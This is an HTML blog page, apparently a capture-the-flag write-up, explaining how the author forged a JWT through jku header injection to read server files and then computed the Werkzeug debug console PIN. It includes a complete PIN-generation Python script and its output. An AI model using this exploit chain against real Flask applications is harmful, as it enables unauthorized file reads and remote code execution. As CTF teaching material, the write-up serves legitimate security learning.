@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=8664&amp;path=livereload" data-no-instant defer></script>
+  
+    <title> :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Admin ? Hard: 700 (560) pts Our server was compromised, we got our hands on a website that the attackers hosted there. A super important secret is there, can you bring us its contents?
+Challmaker: sc0r7
+Recognition phase In this app we can see that we have the opportunity to read a file on the system.
+But trying to do so we get Permission error: You are not an admin, you do not have access to read server files
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:8664/writeups/admin/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:8664/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:8664/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="//localhost:8664/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="">
+<meta property="og:description" content="Admin ? Hard: 700 (560) pts Our server was compromised, we got our hands on a website that the attackers hosted there. A super important secret is there, can you bring us its contents?
+Challmaker: sc0r7
+Recognition phase In this app we can see that we have the opportunity to read a file on the system.
+But trying to do so we get Permission error: You are not an admin, you do not have access to read server files
+" />
+<meta property="og:url" content="//localhost:8664/writeups/admin/" />
+<meta property="og:site_name" content="" />
+
+  
+    <meta property="og:image" content="//localhost:8664/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/writeups/admin/index.xml" rel="alternate" type="application/rss+xml" title="" />
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="blue">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    0z stuff&#39;s
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+    <div class="index-content">
+      <h1 id="admin-"><strong><em>Admin ?</em></strong></h1>
+<h3 id="hard-700-560-pts">Hard: 700 (560) pts</h3>
+<blockquote>
+<p>Our server was compromised, we got our hands on a website that the attackers hosted there. A super important secret is there, can you bring us its contents?</p>
+</blockquote>
+<blockquote>
+<p>Challmaker: sc0r7</p>
+</blockquote>
+<h3 id="recognition-phase">Recognition phase</h3>
+<p>In this app we can see that we have the opportunity to read a file on the system.</p>
+<p>But trying to do so we get <code>Permission error: You are not an admin, you do not have access to read server files</code></p>
+<p><img src="forbidden_lfi.png" alt="lfi forbidden"></p>
+<p>Now moving on and trying to examine the JWT token we see that there is a <code>profile</code> key in the payload part set to <code>visitor</code> which is certainly the way that the app make sure that we&rsquo;re an admin or visitor</p>
+<p><img src="jwt_looking_weak.png" alt="jwt looking weak"></p>
+<p>After trying some common quick stuffs to modify it to <code>admin</code> I decided to read about the <code>jku</code> header.</p>
+<p>So briefly summarized the <code>jku</code> hold a path to a file where a KEY is contained. And this key is used to verify that the token is authentic and it hasn&rsquo;t been tampered. But the thing is this path could also be a link and if the server doesn&rsquo;t check the origin of the key we might then:</p>
+<p><strong>Create our own key</strong></p>
+<p><img src="key_gen.png" alt="key gen"></p>
+<p><strong>Modify the jku origin to our key url and use our key to sign the modified token</strong></p>
+<p><img src="jku_exploit.png" alt="jku exploit"></p>
+<p>Then the server is going to check the token with our key and we will be able to read files</p>
+<p><img src="etc_passwd.png" alt="etc passwd"></p>
+<p>For a more detailled overview here is a link that explains it: <a href="https://cyberw1ng.medium.com/22-5-lab-jwt-authentication-bypass-via-jku-header-injection-1ec5032245b3">Jku Header Injection</a></p>
+<p>In the previous picture we see that there is a user named <code>scort</code> (S/O challmaker) with a home directory <code>/home/scort</code></p>
+<p>I tried to read his ssh private key as well as some other interesting file but didn&rsquo;t find anything profitable.</p>
+<p>I then remembered that when doing the directory enumeration I saw this:</p>
+<p><img src="console_open.png" alt="console_open"></p>
+<p>This means that the <code>debug mode</code> was enabled and that is not supposed to be the case in production. Trying to access it we&rsquo;re required the <code>Werkzeug Console Pin</code>. But here is the thing. This PIN isn&rsquo;t randomly generated. In fact it is mostly based on environment information such a the <code>username</code> of the user running the app, the <code>flask script</code>, the <code>mac address</code>, the <code>modname</code> etc&hellip;</p>
+<p>So knowing that we already have an LFI we&rsquo;re know able to retrieve those information in order to generate the PIN.</p>
+<p>Here is a github script for that purpose filled with the correct parameters</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">Python Script</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+#!/bin/python3
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+        &#39;scort&#39;,
+        &#39;flask.app&#39;, # modname
+        &#39;Flask&#39;, # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+        &#39;/home/scort/.local/lib/python3.9/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
+]
+
+private_bits = [
+        &#39;2485378678786&#39;, # read /sys/class/net/eth0/address for example 0d:4a:cd:.. and convert it to 0x0d4acd...
+        &#39;7988d89c-f2a7-41f6-a5b7-50f32316852a&#39; # Machine Id: /etc/machine-id(empty in our case) &#43; /proc/sys/kernel/random/boot_id &#43; /proc/self/cgroup (also empty)
+]
+
+h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
+for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+                continue
+        if isinstance(bit, str):
+                bit = bit.encode(&#39;utf-8&#39;)
+        h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+
+cookie_name = &#39;__wzd&#39; &#43; h.hexdigest()[:20]
+
+num = None
+if num is None:
+        h.update(b&#39;pinsalt&#39;)
+        num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+
+rv = None
+if rv is None:
+        for group_size in 5, 4, 3:
+                if len(num) % group_size == 0:
+                        rv = &#39;-&#39;.join(num[x:x &#43; group_size].rjust(group_size, &#39;0&#39;)
+                                                  for x in range(0, len(num), group_size))
+                        break
+        else:
+                rv = num
+
+print(&#34;Pin: &#34; &#43; rv)
+
+</code></pre>
+  </div>
+
+
+<p>Running it we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  werkzeug-debug-console-bypass git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ✗ python3 werkzeug-pin-bypass.py
+</span></span><span style="display:flex;"><span>Pin: 114-668-164
+</span></span></code></pre></div><p>Now that we have the pin we are able to open the console and then execute our python code to retrieve the flag</p>
+<p><img src="flag.png" alt="flag"></p>
+<h5 id="by-w1z0z---l3gm1nn"><em>By w1z0z - (l3gm1nn)</em></h5>
+
+    </div>
+  
+  <div class="posts">
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
